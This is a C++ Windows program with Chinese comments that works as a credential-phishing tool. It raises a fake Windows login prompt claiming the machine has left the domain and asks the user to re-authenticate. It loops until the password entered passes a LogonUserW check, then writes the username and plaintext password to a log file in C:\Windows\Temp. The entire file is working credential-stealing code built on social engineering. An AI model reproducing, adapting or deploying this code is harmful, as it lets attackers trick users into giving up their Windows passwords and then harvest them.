#include <Windows.h>
#include <wincred.h>
#pragma comment(lib,"Credui.lib")

BOOL WriteCred(LPWSTR saveAs,LPWSTR username, LPWSTR password) {
	PWCHAR szBuffer = new WCHAR[CREDUI_MAX_USERNAME_LENGTH + CREDUI_MAX_USERNAME_LENGTH+1];
	HANDLE hFile = CreateFile(
		saveAs,
		GENERIC_ALL,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	wsprintf(szBuffer, L"[+]Username: %s , Password: %s\n", username, password);
	if (hFile != INVALID_HANDLE_VALUE) {
		WriteFile(hFile, szBuffer, lstrlenW(szBuffer)*sizeof(WCHAR), NULL, NULL);
		CloseHandle(hFile);
		return TRUE;
	}
	return FALSE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WCHAR username[CREDUI_MAX_USERNAME_LENGTH*  sizeof(WCHAR)] = { 0 };
	WCHAR password[CREDUI_MAX_PASSWORD_LENGTH*  sizeof(WCHAR)] = { 0 };
	WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)] = { 0 };
	DWORD dwUsernameSize = CREDUI_MAX_USERNAME_LENGTH+1;
	DWORD dwPasswordSize = CREDUI_MAX_PASSWORD_LENGTH+1;
	DWORD dwDomainSize = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
	WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
	WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
	// 提示信息
	WCHAR baseCaption[] = L"请输入当前用户账号密码：";
	WCHAR pszCaptionText[] = L"您的机器已脱域，请重新认证";
	// 保存凭据位置
	WCHAR saveAs[] = L"C:\\Windows\\Temp\\creds.log";
	LPWSTR boxMessage = NULL;
	ULONG  authPackage = 0;
	LPVOID outCredBuffer = NULL;
	ULONG  outCredSize = 0;
	BOOL   bsave = FALSE;
	BOOL   bLoginStatus = FALSE;
	CREDUI_INFOW credui = { sizeof(credui) };
	credui.cbSize = sizeof(credui);
	HANDLE hLogon = NULL;
	credui.hwndParent = NULL;

	credui.pszMessageText = baseCaption;
	credui.pszCaptionText = (PCWSTR)pszCaptionText;
	// Always try to Login...
	__LOGIN:
	DWORD dwRet = CredUIPromptForWindowsCredentialsW(
		&credui, 
		0, 
		&authPackage, 
		NULL, 
		0, 
		&outCredBuffer, 
		&outCredSize, 
		&bsave, 
		CREDUIWIN_ENUMERATE_CURRENT_USER
	);
	if (dwRet == ERROR_SUCCESS) {
		CredUnPackAuthenticationBufferW(
			CRED_PACK_PROTECTED_CREDENTIALS,
			outCredBuffer, 
			outCredSize, 
			username,
			&dwUsernameSize,
			domain, 
			&dwDomainSize, 
			password, 
			&dwPasswordSize
		);

		CredUIParseUserNameW(
			username, 
			parsedUserName, 
			CREDUI_MAX_USERNAME_LENGTH + 1,
			parsedDomain, 
			CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1
		);
		bLoginStatus = LogonUserW(parsedUserName, parsedDomain, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &hLogon);
		if (bLoginStatus) {
			WriteCred(saveAs, username, password);
			// MessageBox(NULL, username, password, MB_OK);
		}
		else {
			// 如果登录失败，继续登录。
			goto __LOGIN;
		}
	}

	return 0;
}